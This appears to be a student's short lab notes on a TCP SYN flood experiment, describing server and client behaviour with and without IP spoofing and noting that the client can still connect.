with no spoof by attacker --> attacker responds with RST because it doesn't know to have sent the first ACK (free TCB)

with spoof by attacker --> the server does not respond in time to attacker SYNs.
After all SYN, server responds in broadcast to attacker (22.23.24.25.255) with SYN ACK because it is no be able to solve the ARP protocol 
to find the MAC of the spoofed IP. So, the half-tcp connection is not established and the memory is not allocated.
Also, the attacker and the client are no more under the same network.

with spoof by attacker exploiting the client ip knowledge --> client receives a lot of SYN ACK but it responses back with RST, because it did not generate those SYN (free TCB)

In any case client is able to perform request
